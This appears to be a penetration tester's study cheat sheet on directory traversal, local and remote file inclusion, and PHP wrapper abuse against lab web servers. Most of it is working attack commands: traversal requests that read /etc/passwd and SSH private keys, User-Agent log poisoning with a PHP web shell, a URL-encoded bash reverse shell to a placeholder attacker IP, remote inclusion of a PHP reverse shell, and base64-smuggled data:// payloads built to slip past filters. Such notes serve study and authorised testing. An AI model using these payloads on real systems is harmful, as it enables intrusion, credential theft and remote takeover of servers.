### Directory Traversal:

Never forget to check for the basics once you've identified potential traversal/inclusion!
`curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd`
`curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa`

For IIS targets spice can be found at: `C:\inetpub\logs\LogFiles\W3SVC1\` and `C:\inetpub\wwwroot\web.config`
Windows targets can potentially only be vulnerable when a `\` is provided. Be sure to try both. WAF, application logic or web server may filter on the `../` syntax. Be sure to try `%2E%2E/`.

### Example LFI Exploit:

1. Identify directory traversal in vulnerable web server
2. Identify a log file that the user can potentially write to, in the case of an Apache server: `/var/log/apache2/access.log`
3. Dump its contents, see what exactly the user can control. In this case, the contents of the `User Agent` header are written to the log
4. Repeat the request with Burp, but now with the `User Agent` header poisoned with some PHP:
`<?php echo system($_GET['cmd']); ?>`
5. With this written to the log, curl the log once again, if vulnerable to LFI the log will be rendered in the browser, and the PHP will execute
`curl http://vulnerable.ohno/../../../../../../../../../var/log/apache2/access.log?cmd=ls`
6. Once you've confirmed you have code execution pass a URL encoded reverse shell to the cmd parameter. Don't forget to start your listener!
`curl http://vulnerable.ohno/../../../../../../../../../var/log/apache2/access.log?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<Attacker IP>%2F4444%200%3E%261%22`

### Example RFI Exploit:

Exploiting the same principle as LFI, except this server will actually render content that is not necessarily on the same server. Whack.
1. Identify a parameter that takes an argument for the page that the application should render, or similar. Eg.
http://mountaindesserts.com/meteor/index.php?page=cats.html
2. Start an http server from a directory containing a payload:
`cd /usr/share/webshells/php; python3 -m http.server 80`
3. Start a listener:
`nc -nvlp 4444`
4. Run your favourite command:
`curl "http://mountaindesserts.com/meteor/index.php?page=http://<your IP>/php-reverse-shell.php"`

### Filter PHP Wrapper:

If a server is vulnerable to this then we can potentially view the contents of the PHP as it appears server side. This will enable us to inspect the code before it has been executed, allowing us to analyse application logic and potentially grab some creds.
`curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php`
`echo ourBase64EncodedData | base64 -d`

### Data PHP Wrapper:

filter can recover source code, data can achieve code execution:
`curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"`
If the server/firewall employs mechanisms for filtering for commands like ‘system()’ we can base64 encode again to smuggle our payload:
`echo -n '<?php echo system($_GET["cmd"]);?>' | base64`
`curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,<ourBase64EncodedPayload>?cmd=ls`
Nb. while worth trying, this exploit is unlikely to be viable, the allow_url_include setting needs to be enabled, and it is not by default.